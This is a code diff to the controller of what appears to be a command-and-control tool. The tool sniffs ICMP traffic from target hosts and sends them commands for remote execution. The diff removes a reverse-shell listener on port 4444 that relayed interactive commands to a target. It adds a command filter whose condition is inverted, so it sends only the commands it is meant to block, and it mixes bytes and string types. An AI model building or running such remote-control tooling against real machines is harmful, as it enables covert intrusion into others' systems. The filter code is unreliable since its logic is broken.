@@ -43,6 +43,13 @@ class Controller(Host):
     def sniffing(self, target_ip):
         sniff(iface=self.iface, prn=self.sniff_callback, filter=f"src host {target_ip} and icmp", store="0")
 
+    def filter_commands(self, cmd):
+        cmd = cmd.split(" ")[0]
+        if cmd in ("vim", "nano", "vi", "visudo", "watch", "emacs"):
+            print(f"Command {cmd} is not valid as it requires an interactive shell")
+            return False
+        return True
+
     def interact(self, target):
         Target = Query()
         target = self.db.search(Target.id == target)[0]
@@ -57,9 +64,9 @@ class Controller(Host):
                 if cmd == b'exit':
                     sniffer.kill()
                     break
-                elif len(cmd) != 0:
+                elif len(cmd) != 0 and not self.filter_commands(cmd):
                     self.send(target['ip'], "instruction", cmd)
-                    
+        
     def instruction(self, shellpack):
         if shellpack['option'] == "TRUNCATED":
             print(shellpack['data'].decode(), end="")
@@ -72,30 +79,6 @@ class Controller(Host):
         else:
             print(f"{shellpack['data'].decode()}")
             shell_lock.value = False
-    
-    def reverse(self, target):
-        Target = Query()
-        target = self.db.search(Target.id == target)[0]
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind(("0.0.0.0", 4444))
-        s.listen(1)
-        self.send(target['ip'], "reverse")
-        conn, addr = s.accept()
-        print('Connection received from ',addr)
-
-        while True:
-            #Receive data from the target and get user input
-            ans = conn.recv(1024).decode()
-            sys.stdout.write(ans)
-            command = input()
-
-            #Send command
-            command += "\n"
-            conn.send(command.encode())
-            time.sleep(1)
-
-            #Remove the output of the "input()" function
-            sys.stdout.write(ans.split("\n")[-1])
 
 if __name__ == "__main__":
     controller = Controller()
@@ -106,8 +89,14 @@ if __name__ == "__main__":
             print(controller.list_hosts())
         case "interact":
             controller.interact(int(sys.argv[2]))
-        case "reverse":
-            controller.reverse(int(sys.argv[2]))
+        case "run":
+            print("Run a specific module")
+        case "broadcast":
+            print("Broadcast")
+        case "--help":
+            print("Help command")
+        case _:
+            print("Default")
 
             
     
